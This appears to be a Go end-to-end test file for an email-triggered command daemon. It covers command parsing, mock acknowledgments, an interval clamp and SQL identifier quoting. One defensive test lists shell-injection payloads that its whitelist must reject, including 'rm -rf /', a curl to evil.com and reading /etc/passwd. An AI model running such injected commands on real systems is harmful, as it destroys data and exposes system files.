//go:build e2e

package e2e_test

import (
	"bytes"
	"context"
	"strings"
	"testing"
	"time"

	"github.com/alimtvnetwork/gitmap-v28/cli/cmdlemon"
	"github.com/alimtvnetwork/gitmap-v28/cli/dbengine/sqlite"
)

// TestLemonEmail_EndToEndWorkflow verifies the full email command lifecycle:
// Ingestion -> Parse -> Immediate ACK -> Sandboxed Execution -> Completion Report.
func TestLemonEmail_EndToEndWorkflow(t *testing.T) {
	// Step 1: Ingest email with Format A (Plain text command)
	inboundMsg := cmdlemon.EmailMessage{
		From:    "lead-developer@example.com",
		To:      "lemon-bot@example.com",
		Subject: "cmd: gitmap status --json",
		Body:    "cmd: gitmap status --json",
	}

	env, parseErr := cmdlemon.ParseEmailCommand(inboundMsg)
	if parseErr != nil {
		t.Fatalf("unexpected parse error: %v", parseErr)
	}
	if env.Command != "status" {
		t.Errorf("expected command 'status', got %q", env.Command)
	}
	if env.Format != cmdlemon.EmailFormatTypeText {
		t.Errorf("expected format type text, got %v", env.Format)
	}

	// Step 2: Immediate Receipt Acknowledgment (ACK)
	var ackDispatched bool
	var ackRecipient, ackSubject, ackBody string
	mockTransmitter := cmdlemon.EmailTransmitterFunc(func(to, subject, body string) error {
		ackDispatched = true
		ackRecipient = to
		ackSubject = subject
		ackBody = body
		return nil
	})

	ackReplier := cmdlemon.NewAckReplier(mockTransmitter)
	if ackErr := ackReplier.DispatchAck(env); ackErr != nil {
		t.Fatalf("failed to dispatch immediate ACK: %v", ackErr)
	}

	if !ackDispatched {
		t.Fatal("expected ACK to be dispatched immediately")
	}
	if ackRecipient != "lead-developer@example.com" {
		t.Errorf("unexpected ACK recipient: %s", ackRecipient)
	}
	if !strings.Contains(ackSubject, "ACK Received:") {
		t.Errorf("ACK subject must contain 'ACK Received:', got: %s", ackSubject)
	}
	if !strings.Contains(ackBody, "ACK Received: Command 'status") {
		t.Errorf("ACK body must contain 'ACK Received: Command 'status', got: %s", ackBody)
	}

	// Step 3: Sandboxed Execution via MockCommandExecutor
	mockExecutor := &cmdlemon.MockCommandExecutor{
		Handler: func(ctx context.Context, args []string) (cmdlemon.ExecutionResult, error) {
			return cmdlemon.ExecutionResult{
				ExitCode:   0,
				Stdout:     `{"status":"ONLINE","workspace":"gitmap"}`,
				DurationMs: 12,
				IsSuccess:  true,
			}, nil
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	execResult, execErr := mockExecutor.Execute(ctx, env.Command)
	if execErr != nil {
		t.Fatalf("unexpected execution error: %v", execErr)
	}
	if !isE2EExecutionValid(execResult) {
		t.Errorf("expected successful execution, got exit code %d", execResult.ExitCode)
	}

	// Step 4: Completion Reporting
	reporter := cmdlemon.NewEmailReporter(mockTransmitter)
	outcome := cmdlemon.ExecutionOutcome{
		Command:     env.Command,
		RequestID:   env.RequestID,
		ExitCode:    execResult.ExitCode,
		Duration:    time.Duration(execResult.DurationMs) * time.Millisecond,
		Stdout:      execResult.Stdout,
		Stderr:      execResult.Stderr,
		CompletedAt: time.Now().UTC(),
		IsSuccess:   execResult.IsSuccess,
	}
	if reportErr := reporter.SendCompletionReport(env.Sender, outcome); reportErr != nil {
		t.Fatalf("failed to send completion report: %v", reportErr)
	}
}

// TestLemonEmail_MultiFormatSupport verifies Formats A, B, and C parsing.
func TestLemonEmail_MultiFormatSupport(t *testing.T) {
	testCases := []struct {
		name        string
		msg         cmdlemon.EmailMessage
		wantCmd     string
		wantFormat  cmdlemon.EmailFormatType
		wantSubargs int
	}{
		{
			name: "Format A: Slash Command",
			msg: cmdlemon.EmailMessage{
				From:    "user@example.com",
				Subject: "Question",
				Body:    "/pull --all",
			},
			wantCmd:     "pull",
			wantFormat:  cmdlemon.EmailFormatTypeText,
			wantSubargs: 1,
		},
		{
			name: "Format B: JSON Envelope",
			msg: cmdlemon.EmailMessage{
				From:    "ci@example.com",
				Subject: "Automated trigger",
				Body:    `{"command":"agm","args":["queue","audit"],"requestId":"req-ci-101"}`,
			},
			wantCmd:     "agm",
			wantFormat:  cmdlemon.EmailFormatTypeJSON,
			wantSubargs: 2,
		},
		{
			name: "Format C: Markdown Header",
			msg: cmdlemon.EmailMessage{
				From:    "admin@example.com",
				Subject: "Task",
				Body:    "# Command: nodes\n--json\n--all",
			},
			wantCmd:     "nodes",
			wantFormat:  cmdlemon.EmailFormatTypeYAML,
			wantSubargs: 2,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			env, err := cmdlemon.ParseEmailCommand(tc.msg)
			if err != nil {
				t.Fatalf("unexpected parse error: %v", err)
			}
			if env.Command != tc.wantCmd {
				t.Errorf("expected command %q, got %q", tc.wantCmd, env.Command)
			}
			if env.Format != tc.wantFormat {
				t.Errorf("expected format %v, got %v", tc.wantFormat, env.Format)
			}
			if len(env.Args) != tc.wantSubargs {
				t.Errorf("expected %d args, got %d", tc.wantSubargs, len(env.Args))
			}
		})
	}
}

// TestLemonDaemon_IntervalSafetyGuard enforces the non-negotiable 5s safety clamp.
func TestLemonDaemon_IntervalSafetyGuard(t *testing.T) {
	var buf bytes.Buffer
	guard := cmdlemon.NewIntervalGuard(&buf)

	// Below minimum (e.g. 1s or 3s) must be clamped to 5s
	clamped1 := guard.ResolveInterval(1 * time.Second)
	if clamped1 != 5*time.Second {
		t.Errorf("expected 1s to be clamped to 5s, got %v", clamped1)
	}
	if !strings.Contains(buf.String(), "Notice: interval clamped to minimum 5s safety threshold") {
		t.Errorf("expected clamping notice to be printed, got: %s", buf.String())
	}

	// 0 or negative must use default 8s
	clampedZero := guard.ResolveInterval(0)
	if clampedZero != 8*time.Second {
		t.Errorf("expected 0 to resolve to 8s default, got %v", clampedZero)
	}

	// Valid interval above 5s (e.g. 8s or 15s) must be preserved
	valid8 := guard.ResolveInterval(8 * time.Second)
	if valid8 != 8*time.Second {
		t.Errorf("expected 8s to be preserved, got %v", valid8)
	}
}

// TestLemonSecurity_ShellInjectionRejection verifies rejection of malicious commands.
func TestLemonSecurity_ShellInjectionRejection(t *testing.T) {
	maliciousCases := []string{
		"status; rm -rf /",
		"pull && curl evil.com",
		"version | cat /etc/passwd",
		"nodes `calc.exe`",
		"$(whoami)",
	}

	for _, malCmd := range maliciousCases {
		_, err := cmdlemon.ParseAndAuthorizeCommand(malCmd)
		if err == nil {
			t.Errorf("expected command %q to be denied by whitelist sandbox, but was allowed", malCmd)
		}
	}
}

// TestDatabase_TypeSafetyAndIdentifierQuoting verifies compiler quote escaping.
func TestDatabase_TypeSafetyAndIdentifierQuoting(t *testing.T) {
	compiler := sqlite.NewCompiler()

	// Normal identifier
	quotedNormal := compiler.QuoteIdentifier("DetectedProject")
	if quotedNormal != `"DetectedProject"` {
		t.Errorf("unexpected normal quote: %s", quotedNormal)
	}

	// Embedded quote injection attempt
	quotedInjected := compiler.QuoteIdentifier(`table"name`)
	if quotedInjected != `"table""name"` {
		t.Errorf("expected embedded quotes to be doubled for SQL safety, got: %s", quotedInjected)
	}
}

func isE2EExecutionValid(res cmdlemon.ExecutionResult) bool {
	if res.IsSuccess && res.ExitCode == 0 {
		return true
	}
	return false
}
